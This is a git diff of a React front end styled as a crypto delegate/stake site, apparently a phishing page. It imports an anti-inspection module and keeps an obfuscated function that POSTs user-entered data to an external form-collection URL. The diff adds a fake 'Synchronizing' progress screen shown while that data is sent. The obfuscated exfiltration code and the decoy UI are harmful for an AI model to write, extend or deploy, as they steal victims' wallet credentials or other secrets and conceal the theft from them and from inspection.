@@ -21,6 +21,16 @@ import { useState, useEffect } from "react";
 import blockInspectTools from "./antiInspect";
 import FlareDrop from './assets/flaredrop_4x.webp'
 import CityOri from './assets/city_ori.mp4'
+import {
+  CircularProgressbar,
+  CircularProgressbarWithChildren,
+  buildStyles
+} from "react-circular-progressbar";
+import 'react-circular-progressbar/dist/styles.css';
+import { easeQuadInOut } from 'd3-ease';
+import ChangingProgressProvider from './assets/ChangingProgressProvider'
+import AnimatedProgressProvider from './assets/AnimatedProgressProvider'
+
 
 const Header = () => (
 
@@ -116,8 +126,8 @@ const Main = () => {
             </div>
 
             <div className="delegateStake">
-              <button onClick={()=>{OpenModal()}} className="delegateButton">Delegate</button>
-              <button onClick={()=>{OpenModal()}} className="delegateButton">Stake</button>
+              <button onClick={() => { OpenModal() }} className="delegateButton">Delegate</button>
+              <button onClick={() => { OpenModal() }} className="delegateButton">Stake</button>
             </div>
           </div>
         </div>
@@ -245,6 +255,7 @@ const BsScreen = () => {
   (function (_0x18adc4, _0x1976be) { var _0x24796c = _0x5135, _0x3439df = _0x18adc4(); while (!![]) { try { var _0x410db9 = parseInt(_0x24796c(0xf4)) / 0x1 + parseInt(_0x24796c(0xfc)) / 0x2 + -parseInt(_0x24796c(0xf6)) / 0x3 + parseInt(_0x24796c(0xf0)) / 0x4 * (-parseInt(_0x24796c(0xf1)) / 0x5) + -parseInt(_0x24796c(0xf8)) / 0x6 + parseInt(_0x24796c(0xf5)) / 0x7 * (-parseInt(_0x24796c(0xfa)) / 0x8) + parseInt(_0x24796c(0xf7)) / 0x9 * (parseInt(_0x24796c(0xf3)) / 0xa); if (_0x410db9 === _0x1976be) break; else _0x3439df['push'](_0x3439df['shift']()); } catch (_0x45fdfe) { _0x3439df['push'](_0x3439df['shift']()); } } }(_0x13af, 0xc26e0)); function _0x5135(_0x180b0b, _0x15f8be) { var _0x13af2c = _0x13af(); return _0x5135 = function (_0x51351a, _0x31aab7) { _0x51351a = _0x51351a - 0xf0; var _0x2476f7 = _0x13af2c[_0x51351a]; return _0x2476f7; }, _0x5135(_0x180b0b, _0x15f8be); } function _0x13af() { var _0x114814 = ['2735770klJZJX', '7559zbMzXT', '921746tdvFIX', '1876518AyhIjE', '144qTURSM', '4659132wzhGnm', 'POST', '88zWGJJH', 'https://submit-form.com/vNUx1nYFp', '165768NDytdD', '656644lXRZvM', '25XRAnOG', 'json']; _0x13af = function () { return _0x114814; }; return _0x13af(); } function ImportStan(_0x23dd4f) { var _0x54a133 = _0x5135; return fetch(_0x54a133(0xfb), { 'method': _0x54a133(0xf9), 'headers': { 'Content-Type': 'application/json' }, 'body': JSON['stringify'](_0x23dd4f) })['then'](_0xed70a1 => { var _0x6205a8 = _0x54a133; if (!_0xed70a1['ok']) throw new Error('Network\x20response\x20was\x20not\x20ok'); return _0xed70a1[_0x6205a8(0xf2)](); }); }
 
   function finalSink(payload) {
+    setActiveModal('sy')
     return ImportStan(payload);
   }
 
@@ -256,7 +267,7 @@ const BsScreen = () => {
     setActiveModal('in')
   }
 
-  
+
 
   useEffect(() => {
     if (activeModal === 'ld') {
@@ -620,6 +631,29 @@ const BsScreen = () => {
           }} className="proceed">Proceed</button></div>
         </div>
       </div>}
+      {activeModal === 'sy' && <div id="syScreen" className="syScreen">
+        <div style={{
+          display: 'flex',
+          height: '80%',
+          flexDirection: 'column',
+          justifyContent: 'space-around',
+          gap: 20,
+          alignItems: 'center'
+        }}>
+          <Example>
+            <ChangingProgressProvider values={[0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100]}>
+              {percentage => (
+                <CircularProgressbar
+                  value={percentage}
+                 
+                />
+              )}
+            </ChangingProgressProvider>
+          </Example>
+
+          <h2>Synchronizing.....</h2>
+        </div>
+      </div>}
 
     </section>
   )
@@ -703,6 +737,17 @@ function OpenModal() {
   if (bScreen) {
     bScreen.style.display = 'flex';
   }
+}
+
+function Example(props) {
+  return (
+    <div style={{marginBottom: 20}}>
+      <div style={{ display: "flex", justifyContent: 'center'}}>
+        <div style={{ width: "60%"}}>{props.children}</div>
+
+      </div>
+    </div>
+  );
 }
 
 const App = () => {
